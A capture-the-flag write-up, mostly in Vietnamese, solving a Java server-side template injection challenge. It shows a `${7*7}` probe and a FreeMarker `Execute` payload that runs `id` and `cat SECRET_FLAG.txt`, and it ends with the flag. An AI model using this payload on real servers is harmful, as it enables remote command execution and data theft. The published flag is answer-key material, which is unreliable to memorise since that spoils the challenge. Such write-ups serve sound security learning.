# Java - Server-side Template Injection

30 Points

Statement: Exploit the vulnerability in order to retrieve the validation password in the file SECRET_FLAG.txt.

# Solution

Ta có form của challenge

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/2712ca98-5e65-4469-8687-4a41441e90f5)

Mình test chức năng của challenge. Vì bài này tên là java nên mình sẽ thử `${7*7}`

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/058acecb-d99f-4d89-8393-4a846af64794)

Tiếp theo mình sẽ thử payload này `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/56595721-c868-4ef8-bee1-4af87264a449)

Có cho ra kết quả nên ta có thể sử dụng payload này. Kế đó mình sẽ dùng lệnh cat để lấy flag trong file `SECRET_FLAG.txt` như đề bài có nhắc đến.

`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat SECRET_FLAG.txt")}`

![image](https://github.com/Llam-a/Server-Side-Template-Injection/assets/115911041/e04334da-a5be-4096-958a-2b63484d85eb)

Flag: `B3wareOfT3mplat3Inj3ction`



